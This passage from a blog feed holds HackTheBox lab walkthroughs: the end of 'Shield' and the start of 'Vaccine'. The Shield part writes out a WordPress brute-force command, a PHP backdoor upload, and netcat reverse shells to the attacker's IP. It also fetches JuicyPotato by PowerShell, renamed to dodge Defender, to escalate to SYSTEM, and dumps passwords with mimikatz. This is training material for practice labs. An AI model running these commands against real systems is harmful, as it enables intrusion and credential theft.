:: Progress: [4614/4614]&#xA0;:: Job [1/1] :: 155 req/sec :: Duration: [0:00:33] :: Errors: 0 ::</code></pre><p>So we have only one directory and it is wordpress. Let&apos;s jump to our web browser and navigate to the <code>http://10.10.10.29/wordpress</code></p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-42.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1353" height="741" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-42.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-42.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-42.png 1353w" sizes="(min-width: 720px) 720px"></figure><p><br>Now you can see there is a wordpress site hosted on the server. So now, time to use <code>wpscan </code>tool. By using this tool we can do lots of things on Wordpress CMS like enumerating plugins, users, themes, backups and also we can use this tool to brute force wordpress passwords.</p><pre><code class="language-bash">wpscan --url http://10.10.10.29/wordpress -e u</code></pre><p>Here is the output. &#x1F447;&#x1F447;</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Shield]
&#x2514;&#x2500;# wpscan --url http://10.10.10.29/wordpress -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ &#xAE;
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &apos;_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.29/wordpress/ [10.10.10.29]
[+] Started: Thu May 20 10:33:23 2021

  &lt;snap&gt;
  ............
  &lt;/snap&gt;

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.10.29/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu May 20 10:33:31 2021
[+] Requests Done: 13
[+] Cached Requests: 42
[+] Data Sent: 3.559 KB
[+] Data Received: 9.893 KB
[+] Memory used: 122.016 MB
[+] Elapsed time: 00:00:08</code></pre><p>So as you can see there is only one user called <code>admin</code> in this wordpress site. Let&apos;s brute force that user using rockyou password.</p><pre><code class="language-bash">wpscan --url http://10.10.10.29/wordpress --usernames admin --passwords /usr/share/wordlists/rockyou.txt</code></pre><p>But wait, &#x270B;&#x270B;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma8rCTSABTSH_XeG1Vi%2F-Ma9Pbupd4vbukgizp1h%2Fimage.png?alt=media&amp;token=05b1b1e8-042d-42e7-84f6-e05912141401" class="kg-image" alt="Shield Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p><br>Password brute forcing is more time consuming here. Since these boxes are in sequence, we can check previous credentials. &#x1F644;&#x1F644; in vaccine walkthrough we had found some passwords, if you check one by one you will get the right one. here it is <code>P@s5w0rd! </code> &#xA0;So the credentials for wordpress login are</p><p><code>admin : P@s5w0rd!</code></p><p>And if you are not familiar with wordpress sites, <code>/wp-admin</code> is the login page for most of the wordpress sites and it is the default login path. bla bla bala...</p><p>Anyway go to your browser again and navigate to<code>http://10.10.10.29/wordpress/wp-admin</code> . Now you are end up at login page.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-43.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1349" height="706" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-43.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-43.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-43.png 1349w" sizes="(min-width: 720px) 720px"></figure><p>Now you can enter above credentials &#x261D;&#x261D; and click enter. You are successfully logging to the wordpress site as admin. &#x1F451;&#x1F451;</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-44.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1341" height="735" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-44.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-44.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-44.png 1341w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="02-foothold">02. Foothold</h2><p>Now it&apos;s time to upload reverse shell. But keep in mind that you are on the Windows machine. So you must have <code>windows php reverse shell</code> to gain access. Let&apos;s upload a bind shell. You can download it from <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/php/simple-backdoor.php" rel="noopener noreferrer">here</a>. And also we need netcat binary file to get reverse shell. You can download it from <a href="https://github.com/int0x33/nc.exe?files=1" rel="noopener noreferrer">here</a>. &#x1F60A;&#x1F60A;</p><pre><code class="language-bash">wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/php/simple-backdoor.php
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe</code></pre><p>By looking at the dashboard settings, it&apos;s obvious that we have an option to upload media, themes, pages, etc. I&#x2019;ll start from the themes to see what we can do.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-45.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="784" height="692" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-45.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-45.png 784w" sizes="(min-width: 720px) 720px"></figure><p>Then click Add New button.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-46.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="955" height="513" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-46.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-46.png 955w" sizes="(min-width: 720px) 720px"></figure><p><br>Browse and upload both netcat binary and bind shell php script.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-47.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1071" height="541" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-47.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-47.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-47.png 1071w" sizes="(min-width: 720px) 720px"></figure><p>Click &quot;Install Now&quot; button to upload. When you upload the files, You might get an error like this. It&apos;s just ok to ignore this error. &#x1F609;&#x1F609;</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-48.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1029" height="388" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-48.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-48.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-48.png 1029w" sizes="(min-width: 720px) 720px"></figure><p>Then navigate to<code>http://10.10.10.29/wordpress/wp-content/Uploads/simple-backdoor.php?cmd=dir</code></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma9_ZUgRZPcsIQ0dCtu%2F-Ma9a8-AHdQanTEn7xXX%2Fimage.png?alt=media&amp;token=3d967050-fde1-47d1-8870-9d35b320079e" class="kg-image" alt="Shield Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>As you can see, now we have a simple bind shell. Let&apos;s gain reverse shell using this with the help of our netcat binary file. First, power up a netcat listener then navigate to following url. (Change the <code>&lt;YourIP&gt;</code> and <code>&lt;PORT&gt;</code> as yours). <code>%20</code> is indicated as space in url encoding. &#x1F60B;&#x1F60B;</p><p><code>http://10.10.10.29/Wordpress/wp-content/Uploads/simple-backdoor.php?cmd=.\nc.exe%20-e%20cmd.exe%20&lt;YourIP&gt;%20&lt;PORT&gt;</code></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma9_ZUgRZPcsIQ0dCtu%2F-Ma9bcymZhCbDUY9MRSH%2Fimage.png?alt=media&amp;token=3d2aa86d-f7d5-4d2d-bdce-ee98818a8ba4" class="kg-image" alt="Shield Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Now we are on the box as <code>iusr</code>user. Let&apos;s find the user flag.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma9_ZUgRZPcsIQ0dCtu%2F-Ma9byqS0wXbsGl3qeD3%2Fimage.png?alt=media&amp;token=759afd63-8c52-4703-a203-ca2b4566d705" class="kg-image" alt="Shield Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Here we have one user called <code>sandra</code>and we don&apos;t have access to this account. It&apos;s means this is time to escalate privileges.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-49.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="480" height="200"></figure><hr><h2 id="03-privilege-escalation">03. Privilege Escalation</h2><p>Let&apos;s enumerate further to get any vulnerability to gain privilege access. First, we need to check system info.</p><pre><code class="language-bash">C:\Users&gt;systeminfo
systeminfo

Host Name:                 SHIELD
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00376-30000-00299-AA303
Original Install Date:     2/4/2020, 12:58:01 PM
System Boot Time:          5/20/2021, 9:43:58 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,031 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 1,375 MB
Virtual Memory: In Use:    1,056 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    MEGACORP.LOCAL
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.29
                                 [02]: fe80::1588:3a1b:bef9:58b8
                                 [03]: dead:beef::1588:3a1b:bef9:58b8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</code></pre><p>Then check what privileges we have now.</p><pre><code class="language-bash">C:\Users&gt;whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled &#x1F448;
SeCreateGlobalPrivilege Create global objects                     Enabled</code></pre><p>Woooh!! We have the <code>SeImpersonatePrivilege</code>enabled. &#x1F929;&#x1F929; You know what it means, it means we can run <a href="https://github.com/ohpe/juicy-potato" rel="noopener noreferrer">juicy potato</a> to gain privilege. &#x1F954;&#x1F954;Let&apos;s do it..</p><blockquote>Juicy Potato is a variant of the exploit that allows service accounts on Windows to escalate to SYSTEM (highest privileges) by leveraging the BITS and the <code>SeAssignPrimaryToken</code> or <code>SeImpersonate</code> privilege in a MiTM attack.</blockquote><p>Download the <a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe" rel="noopener noreferrer">JuicyPotato </a>binary file and rename it to another file name. Because sometimes windows defender will hate us. And we need to upload it to the box. To do so, power up python demon web server on your machine.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Shield]
&#x2514;&#x2500;# mv JuicyPotato.exe potato.exe

&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Shield]
&#x2514;&#x2500;# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><p>Then we need to upload it in to the box. Type the following command on windows machine <code>(Change &lt;YourIP&gt;)</code>.</p><pre><code class="language-bash">Powershell -c &quot;IWR -useBasicParsing http://&lt;YourIP&gt;:8000/potato.exe -o potato.exe&quot;</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-50.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1208" height="270" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-50.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-50.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-50.png 1208w" sizes="(min-width: 720px) 720px"></figure><p><br>If you read the <a href="https://github.com/ohpe/juicy-potato" rel="noopener noreferrer">documentation </a>of Juicy Potato you will realize it needs Batch file to run. So now we need to create bat file using following commands.</p><pre><code class="language-bash">echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe YourIP YourPort &gt; sh3ll.bat</code></pre><p>Change <code>YourIP </code>and <code>YourPort </code>as yours. After create the batch file, view that file using <code>type </code>command to verify.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-51.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1461" height="132" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-51.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-51.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-51.png 1461w" sizes="(min-width: 720px) 720px"></figure><p><br>Then all the things are fine. Now it&apos;s time to exploit. Let&apos;s power up netcat listener again and execute the following command. If you failed to get reverse shell; change the <code>-c</code> parameter (CLSID) from using <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard" rel="noopener noreferrer">this </a>document and run again. &#x1F60E;</p><pre><code class="language-bash">.\potato.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -p C:\inetpub\wwwroot\wordpress\wp-content\Uploads\sh3ll.bat -l 1337</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-52.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1599" height="434" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-52.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-52.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-52.png 1599w" sizes="(min-width: 720px) 720px"></figure><p><br>We are done. Now we have ultimate power. &#x1F920;&#x1F920;</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-53.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="731" height="328" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-53.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-53.png 731w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-54.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="851" height="773" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-54.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-54.png 851w" sizes="(min-width: 720px) 720px"></figure><hr><h3 id="04-post-exploitation">04. Post Exploitation</h3><p>Now we are at <code>NT AUTHORITY\SYSTEM</code> level. So let&#x2019;s upload <a href="https://github.com/gentilkiwi/mimikatz/wiki" rel="noopener noreferrer">mimikatz </a>and see what we can pull. Mimikatz can be used to dump cached passwords. Download &#xA0;<code>mimikatz</code> tool from <a href="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip" rel="noopener noreferrer">here</a> and upload it to the box.</p><pre><code class="language-bash">wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip &amp;&amp; unzip mimikatz_trunk.zip &amp;&amp; cd x64 &amp;&amp; python3 -m http.server</code></pre><pre><code class="language-bash">IWR -useBasicParsing http://&lt;YourIP&gt;:8000/mimikatz.exe -o mcat.exe</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-55.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1124" height="493" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-55.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-55.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-55.png 1124w" sizes="(min-width: 720px) 720px"></figure><p>Then we can run that file by typing <code>.\mcat</code></p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-56.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="919" height="382" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-56.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-56.png 919w" sizes="(min-width: 720px) 720px"></figure><p><br>We execute mimikatz and use the sekurlsa command to extract logon passwords: <code>sekurlsa::logonpasswords</code></p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-57.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="803" height="491" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-57.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-57.png 803w" sizes="(min-width: 720px) 720px"></figure><p>And we found the password <code>Password1234!</code> for domain user <code>Sandra </code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaCWJxaHniWSpPAiRIa%2F-MaCX1_CLo6zsW-pdUev%2Fimage.png?alt=media&amp;token=4c52c5e6-1f75-4d78-9363-ee53dd0992ec" class="kg-image" alt="Shield Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a> </p>]]></content:encoded></item><item><title><![CDATA[Vaccine Walkthrough]]></title><description><![CDATA[<p>After the Oopsie Walkthrough, here I&apos;m with Vaccine box. Let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be <strong>rooted in sequence</strong>. So it means, if you need to go through</p>]]></description><link>http://192.168.8.3:2368/vaccine-walkthrough/</link><guid isPermaLink="false">60aec2ca54f7b1d506ddba33</guid><category><![CDATA[h4rithd]]></category><category><![CDATA[HackTheBox]]></category><category><![CDATA[HarithDilshan]]></category><category><![CDATA[HTB Walkthrough]]></category><category><![CDATA[HTB Writeup]]></category><category><![CDATA[StartingPoint]]></category><category><![CDATA[Writeup]]></category><category><![CDATA[Vaccine]]></category><category><![CDATA[Vaccine Walkthrough]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Thu, 29 Apr 2021 21:51:00 GMT</pubDate><media:content url="http://192.168.8.3:2368/content/images/2021/05/3.jpg" medium="image"/><content:encoded><![CDATA[<img src="http://192.168.8.3:2368/content/images/2021/05/3.jpg" alt="Vaccine Walkthrough"><p>After the Oopsie Walkthrough, here I&apos;m with Vaccine box. Let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be <strong>rooted in sequence</strong>. So it means, if you need to go through this box you must have a complete Oopsie machine.</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</blockquote><hr><h2 id="00-start-machine-%E2%80%A6">00. Start Machine &#x2026;</h2><p>To start machine, just click &quot;Join Machine&quot;.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma6ZVXn8HPjGO1_C7O5%2F-Ma6adhLsdnklUuCDOrb%2Fimage.png?alt=media&amp;token=8795bc47-aceb-4af0-96df-b1cb16d543b6" class="kg-image" alt="Vaccine Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Start Vaccine Machine </div><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Then you can see the <strong>IP </strong>address for that machine. usually it is <code><strong>10.10.10.46 </strong></code><strong>&#x1F920;</strong></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma6bHFGGA_BKPvfND0L%2F-Ma6by2iwjjKwjRrXySq%2Fimage.png?alt=media&amp;token=057943cd-b56e-4b03-bdb5-9f57f3ce2ade" class="kg-image" alt="Vaccine Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">10.10.10.46</div><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Before going enumeration steps we can simply ping to the IP address and check our VPN connection and whether the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests from passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Vaccine]
&#x2514;&#x2500;# ping 10.10.10.46 -c 2
PING 10.10.10.46 (10.10.10.46) 56(84) bytes of data.
64 bytes from 10.10.10.46: icmp_seq=1 ttl=63 time=235 ms
64 bytes from 10.10.10.46: icmp_seq=2 ttl=63 time=234 ms

--- 10.10.10.46 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1004ms
rtt min/avg/max/mdev = 234.325/234.560/234.796/0.235 ms</code></pre><p>As a ping result, It&apos;s TTL=63. There is only one route between machine and us (VPN). So definitely it will be a Linux machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6">01. Enumeration First &#x2026;</h2><h3 id="011-fast-ports-scan">01.1 Fast ports scan</h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.46</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Vaccine]
&#x2514;&#x2500;# nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.46
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 23:26 EDT
Initiating Ping Scan at 23:26
Scanning 10.10.10.46 [4 ports]
Completed Ping Scan at 23:27, 0.41s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:27
Scanning 10.10.10.46 [65535 ports]
Discovered open port 21/tcp on 10.10.10.46
Discovered open port 22/tcp on 10.10.10.46
Discovered open port 80/tcp on 10.10.10.46
SYN Stealth Scan Timing: About 39.33% done; ETC: 23:28 (0:00:48 remaining)
Completed SYN Stealth Scan at 23:28, 77.77s elapsed (65535 total ports)
Nmap scan report for 10.10.10.46
Host is up, received reset ttl 63 (0.27s latency).
Scanned at 2021-05-19 23:26:59 EDT for 78s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 78.44 seconds
           Raw packets sent: 79277 (3.488MB) | Rcvd: 79253 (3.170MB)</code></pre><p>Now we know which ports are open,</p><h3 id="%E2%80%8C012-run-nmap-scripting-engine">&#x200C;01.2 Run Nmap Scripting Engine</h3><p>To get the best result we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Vaccine]
&#x2514;&#x2500;# nmap -sV -sC -oN DetailPorts.nmap -p 21,22,80 -Pn 10.10.10.46
Host discovery disabled (-Pn). All addresses will be marked &apos;up&apos; and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 23:36 EDT
Nmap scan report for 10.10.10.46
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
